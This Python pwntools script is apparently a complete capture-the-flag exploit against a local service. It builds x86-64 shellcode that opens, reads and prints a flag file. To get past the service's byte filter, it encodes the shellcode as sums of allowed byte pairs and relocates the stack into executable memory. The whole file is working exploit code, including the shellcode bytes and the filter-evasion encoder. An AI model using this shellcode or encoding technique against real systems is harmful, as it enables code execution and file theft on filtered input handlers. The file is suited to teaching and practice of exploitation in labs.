from pwn import *
import struct
from itertools import combinations


class AsgExploit:
    NUM_FILTERED_BYTES = 128
    FILENAME_LENGTH = 72
    SHELLCODE_LENGTH = 1000
    STUB_SIZE = 45

    def __init__(self):
        self.shell = remote('localhost', 9025)
        self.legal_bytes = b""
        self.legal_bytes_mapping = dict()
        self.register_to_bytes_mapping = dict()
        self.construct_register_to_bytes_mapping()
        self.filename = b""
        self.actual_shellcode = b""
        self.compressed_shellcode = b""
        self.legal_registers_opcode_bytes = None

    def get_filtered_bytes(self):
        self.shell.sendline()
        self.shell.recvuntil("bytes:\n")
        filtered_bytes_raw = self.shell.recv(self.NUM_FILTERED_BYTES)
        filtered_bytes = [ord(x) for x in filtered_bytes_raw]
        self.legal_bytes = [b for b in range(256) if b not in filtered_bytes]
        print("Legal bytes:", self.legal_bytes)

    def get_flag_file(self):
        self.shell.recvuntil("file: [")
        self.filename = self.shell.recv(self.FILENAME_LENGTH - 1) + b"\x00"
        print("Flag file:", self.filename)

    def calculate_legal_bytes_mapping(self):
        legal_combinations = list(combinations(self.legal_bytes, 2))
        for l1, l2 in legal_combinations:
            self.legal_bytes_mapping[(l1 + l2) % 256] = (l1, l2)
            if len(self.legal_bytes_mapping) == 256:
                print("Finished calculating legal bytes mapping:")
                print(self.legal_bytes_mapping)
                return

        assert "Mapping mechanism did not work for the given legal bytes"

    def construct_actual_shellcode(self):
        # fd = open(filename)
        open_shellcode = b"\x48\x89\xe7\x90"   # mov rdi, rsp; nop
        open_shellcode += b"\xb0\x02\x0f\x05"  # mov al, 0x2; syscall

        # read(fd, buf, 0x100)
        read_shellcode = b"\x48\x89\xc7\x90"   # mov rdi, rax; nop
        read_shellcode += b"\x48\x89\xe6\x90"  # mov rsi, rsp; nop
        read_shellcode += b"\x66\xba\x40\x00"  # mov dx, 0x40
        read_shellcode += b"\x48\x31\xc0\x90"  # xor rax, rax; nop
        read_shellcode += b"\x0f\x05\x90\x90"  # syscall; nop; nop

        # write(STDOUT, buf, 0x100)
        write_shellcode = b"\x48\x31\xff\x90"   # xor rdi, rdi; nop
        write_shellcode += b"\x48\xff\xc7\x90"  # inc rdi; nop
        write_shellcode += b"\x48\x89\xe6\x90"  # mov rsi, rsp; nop
        write_shellcode += b"\x66\xba\x40\x00"  # mov dx, 0x40
        write_shellcode += b"\x48\x31\xc0\x90"  # xor rax, rax; nop
        write_shellcode += b"\xb0\x01\x0f\x05"  # mov al, 1; syscall

        # exit(0)
        exit_shellcode = b"\x48\x31\xff\x90"   # xor rdi, rdi; nop
        exit_shellcode += b"\x48\x31\xc0\x90"  # xor rax, rax; nop
        exit_shellcode += b"\xb0\x3c\x0f\x05"  # mov al, 0x3c; syscall

        self.actual_shellcode = open_shellcode + read_shellcode + write_shellcode + exit_shellcode

    def correct_stack_pointer_to_filename_before_shellcode(self):
        # Pad shellcode with NOPs to be module 8, taking into account the stack correction
        num_of_nop_padding = 8 - ((len(self.actual_shellcode) + 4) % 8)
        self.actual_shellcode = self.actual_shellcode.rjust(len(self.actual_shellcode) + num_of_nop_padding, b"\x90")
        # Correct the stack pointer so that it will point to the filename by performing add rsp, <shellcode length>
        correct_stack_pointer_opcode = b"\x48\x83\xc4" + struct.pack("<B", len(self.actual_shellcode) + 4)
        self.actual_shellcode = correct_stack_pointer_opcode + self.actual_shellcode

    def calculate_legal_bytes_pairing_per_chunk(self, chunk):
        assert len(chunk) == 8, "Expected chunk size is 8"
        legal_pairing = [b"", b""]
        overflow = 0
        for b in chunk:
            current_pairing = self.legal_bytes_mapping[(ord(b) - overflow) % 256]
            legal_pairing[0] += struct.pack("<B", current_pairing[0])
            legal_pairing[1] += struct.pack("<B", current_pairing[1])
            if current_pairing[0] + current_pairing[1] + overflow >= 256:
                overflow = 1
            else:
                overflow = 0

        return legal_pairing

    def construct_register_to_bytes_mapping(self):
        self.register_to_bytes_mapping[("r8", "r9")] = (0xb8, 0xb9, 0xc8, 0x50)
        self.register_to_bytes_mapping[("r8", "r10")] = (0xb8, 0xba, 0xd0, 0x50)
        self.register_to_bytes_mapping[("r8", "r11")] = (0xb8, 0xbb, 0xd8, 0x50)
        self.register_to_bytes_mapping[("r8", "r12")] = (0xb8, 0xbc, 0xe0, 0x50)
        self.register_to_bytes_mapping[("r8", "r13")] = (0xb8, 0xbd, 0xe8, 0x50)
        self.register_to_bytes_mapping[("r8", "r14")] = (0xb8, 0xbe, 0xf0, 0x50)
        self.register_to_bytes_mapping[("r8", "r15")] = (0xb8, 0xbf, 0xf8, 0x50)

        self.register_to_bytes_mapping[("r9", "r8")] = (0xb9, 0xb8, 0xc1, 0x51)
        self.register_to_bytes_mapping[("r9", "r10")] = (0xb9, 0xba, 0xd1, 0x51)
        self.register_to_bytes_mapping[("r9", "r11")] = (0xb9, 0xbb, 0xd9, 0x51)
        self.register_to_bytes_mapping[("r9", "r12")] = (0xb9, 0xbc, 0xe1, 0x51)
        self.register_to_bytes_mapping[("r9", "r13")] = (0xb9, 0xbd, 0xe9, 0x51)
        self.register_to_bytes_mapping[("r9", "r14")] = (0xb9, 0xbe, 0xf1, 0x51)
        self.register_to_bytes_mapping[("r9", "r15")] = (0xb9, 0xbf, 0xf9, 0x51)

        self.register_to_bytes_mapping[("r10", "r8")] = (0xba, 0xb8, 0xc2, 0x52)
        self.register_to_bytes_mapping[("r10", "r9")] = (0xba, 0xb9, 0xca, 0x52)
        self.register_to_bytes_mapping[("r10", "r11")] = (0xba, 0xbb, 0xda, 0x52)
        self.register_to_bytes_mapping[("r10", "r12")] = (0xba, 0xbc, 0xe2, 0x52)
        self.register_to_bytes_mapping[("r10", "r13")] = (0xba, 0xbd, 0xea, 0x52)
        self.register_to_bytes_mapping[("r10", "r14")] = (0xba, 0xbe, 0xf2, 0x52)
        self.register_to_bytes_mapping[("r10", "r15")] = (0xba, 0xbf, 0xfa, 0x52)

        self.register_to_bytes_mapping[("r11", "r8")] = (0xbb, 0xb8, 0xc3, 0x53)
        self.register_to_bytes_mapping[("r11", "r9")] = (0xbb, 0xb9, 0xcb, 0x53)
        self.register_to_bytes_mapping[("r11", "r10")] = (0xbb, 0xba, 0xd3, 0x53)
        self.register_to_bytes_mapping[("r11", "r12")] = (0xbb, 0xbc, 0xe3, 0x53)
        self.register_to_bytes_mapping[("r11", "r13")] = (0xbb, 0xbd, 0xeb, 0x53)
        self.register_to_bytes_mapping[("r11", "r14")] = (0xbb, 0xbe, 0xf3, 0x53)
        self.register_to_bytes_mapping[("r11", "r15")] = (0xbb, 0xbf, 0xfb, 0x53)

        self.register_to_bytes_mapping[("r12", "r8")] = (0xbc, 0xb8, 0xc4, 0x54)
        self.register_to_bytes_mapping[("r12", "r9")] = (0xbc, 0xb9, 0xcc, 0x54)
        self.register_to_bytes_mapping[("r12", "r10")] = (0xbc, 0xba, 0xd4, 0x54)
        self.register_to_bytes_mapping[("r12", "r11")] = (0xbc, 0xbb, 0xdc, 0x54)
        self.register_to_bytes_mapping[("r12", "r13")] = (0xbc, 0xbd, 0xec, 0x54)
        self.register_to_bytes_mapping[("r12", "r14")] = (0xbc, 0xbe, 0xf4, 0x54)
        self.register_to_bytes_mapping[("r12", "r15")] = (0xbc, 0xbf, 0xfc, 0x54)

        self.register_to_bytes_mapping[("r13", "r8")] = (0xbd, 0xb8, 0xc5, 0x55)
        self.register_to_bytes_mapping[("r13", "r9")] = (0xbd, 0xb9, 0xcd, 0x55)
        self.register_to_bytes_mapping[("r13", "r10")] = (0xbd, 0xba, 0xd5, 0x55)
        self.register_to_bytes_mapping[("r13", "r11")] = (0xbd, 0xbb, 0xdd, 0x55)
        self.register_to_bytes_mapping[("r13", "r12")] = (0xbd, 0xbc, 0xe5, 0x55)
        self.register_to_bytes_mapping[("r13", "r14")] = (0xbd, 0xbe, 0xf5, 0x55)
        self.register_to_bytes_mapping[("r13", "r15")] = (0xbd, 0xbf, 0xfd, 0x55)

        self.register_to_bytes_mapping[("r14", "r8")] = (0xbe, 0xb8, 0xc6, 0x56)
        self.register_to_bytes_mapping[("r14", "r9")] = (0xbe, 0xb9, 0xce, 0x56)
        self.register_to_bytes_mapping[("r14", "r10")] = (0xbe, 0xba, 0xd6, 0x56)
        self.register_to_bytes_mapping[("r14", "r11")] = (0xbe, 0xbb, 0xde, 0x56)
        self.register_to_bytes_mapping[("r14", "r12")] = (0xbe, 0xbc, 0xe6, 0x56)
        self.register_to_bytes_mapping[("r14", "r13")] = (0xbe, 0xbd, 0xee, 0x56)
        self.register_to_bytes_mapping[("r14", "r15")] = (0xbe, 0xbf, 0xfe, 0x56)

        self.register_to_bytes_mapping[("r15", "r8")] = (0xbf, 0xb8, 0xc7, 0x57)
        self.register_to_bytes_mapping[("r15", "r9")] = (0xbf, 0xb9, 0xcf, 0x57)
        self.register_to_bytes_mapping[("r15", "r10")] = (0xbf, 0xba, 0xd7, 0x57)
        self.register_to_bytes_mapping[("r15", "r11")] = (0xbf, 0xbb, 0xdf, 0x57)
        self.register_to_bytes_mapping[("r15", "r12")] = (0xbf, 0xbc, 0xe7, 0x57)
        self.register_to_bytes_mapping[("r15", "r13")] = (0xbf, 0xbd, 0xef, 0x57)
        self.register_to_bytes_mapping[("r15", "r14")] = (0xbf, 0xbe, 0xf7, 0x57)

    def validate_all_must_have_bytes_are_legal(self):
        must_have_bytes_for_compressed_shellcode = b"\x49"  # mov r<x>, const; mov r<y>, const
        must_have_bytes_for_compressed_shellcode += b"\x4d\x01"  # add r<x>, r<y>
        must_have_bytes_for_compressed_shellcode += b"\x41"  # push r<x>
        must_have_bytes_for_compressed_shellcode += b"\x5c"  # pop rsp
        must_have_bytes_for_compressed_shellcode += b"\xff\xe4"  # jmp rsp
        must_have_bytes_for_compressed_shellcode += b"\xe8\x00"  # call <next instruction>

        assert all(ord(b) in self.legal_bytes for b in must_have_bytes_for_compressed_shellcode), \
            "Not all must have bytes are in the legal bytes set, retrying"

    def determine_legal_registers(self):
        for register_pair in self.register_to_bytes_mapping:
            if all(b in self.legal_bytes for b in self.register_to_bytes_mapping[register_pair]):
                self.legal_registers_opcode_bytes = [struct.pack("<B", b)
                                                     for b in self.register_to_bytes_mapping[register_pair]]
                break

        assert self.legal_registers_opcode_bytes, \
            "Did not find a legal register pair that satisfies the legal bytes set, retrying"

    def push_decompressed_payload_to_stack(self, decompressed_payload_chunk):
        current_legal_pairing = self.calculate_legal_bytes_pairing_per_chunk(decompressed_payload_chunk)
        # mov <legal_reg[0]>, <legal_pairing[0]>
        self.compressed_shellcode += b"\x49" + self.legal_registers_opcode_bytes[0] + current_legal_pairing[0]
        # mov <legal_reg[1]>, <legal_pairing[1]>
        self.compressed_shellcode += b"\x49" + self.legal_registers_opcode_bytes[1] + current_legal_pairing[1]
        # add <legal_reg[0]>, <legal_reg[1]>
        self.compressed_shellcode += b"\x4d\x01" + self.legal_registers_opcode_bytes[2]
        # push <legal_reg[0]>
        self.compressed_shellcode += b"\x41" + self.legal_registers_opcode_bytes[3]

    def relocate_stack_to_executable_buffer(self, stack_size):
        # add <legal_reg[0]>, <legal_reg[1]>, spam command to increase rip that passes the filter
        spam_command = b"\x4d\x01" + self.legal_registers_opcode_bytes[2]
        num_spam_commands = ((stack_size - self.STUB_SIZE) // len(spam_command)) + 1
        self.compressed_shellcode += spam_command * num_spam_commands
        # call <next instruction>, now the updated rip is pushed to the stack
        self.compressed_shellcode += b"\xe8\x00\x00\x00\x00"
        # pop rsp, stack is relocated now to executable buffer
        self.compressed_shellcode += b"\x5c"

    def construct_compressed_shellcode(self):
        decompressed_payload = self.actual_shellcode + self.filename
        print("Overall decompressed payload size:", len(decompressed_payload))
        assert (len(decompressed_payload) % 8) == 0, "decompressed payload size should be modulo 8"

        self.validate_all_must_have_bytes_are_legal()

        self.determine_legal_registers()

        # stack relocation is needed because the code is executed from the stack,
        # so we want the stack to be located in the executable mapped memory.
        # The minus 100 is in order to leave some stack space for the shellcode.
        self.relocate_stack_to_executable_buffer(stack_size=len(decompressed_payload))

        # The compressed core pushes the payload into the stack,
        # and pushes to the stack cause the stack pointer to decrease, so we should iterate the payload in reverse order
        for i in range(len(decompressed_payload), 0, -8):
            decompressed_payload_chunk = decompressed_payload[(i - 8):i]
            self.push_decompressed_payload_to_stack(decompressed_payload_chunk)

        self.compressed_shellcode += b"\xff\xe4"  # jmp rsp

        # Padding to fill the input buffer, this won't be executed anyway because the shellcode eventually exits
        self.compressed_shellcode = self.compressed_shellcode.ljust(self.SHELLCODE_LENGTH, b"\xff")

        print("Compressed shellcode size:", len(self.compressed_shellcode))
        print(["0x{:02x}".format(ord(x)) for x in decompressed_payload])
        print(["0x{:02x}".format(ord(x)) for x in self.compressed_shellcode])

    def construct_shellcode(self):
        self.construct_actual_shellcode()
        self.correct_stack_pointer_to_filename_before_shellcode()
        self.construct_compressed_shellcode()

    def run(self):
        self.get_filtered_bytes()
        self.get_flag_file()
        self.calculate_legal_bytes_mapping()
        self.construct_shellcode()
        self.shell.send(self.compressed_shellcode)
        self.shell.interactive()


if __name__ == '__main__':
    attempt = 0
    while True:
        asg_exploit = AsgExploit()
        try:
            print("ATTEMPT", attempt)
            asg_exploit.run()
            break
        except AssertionError as e:
            print(e)
            attempt += 1
            asg_exploit.shell.close()
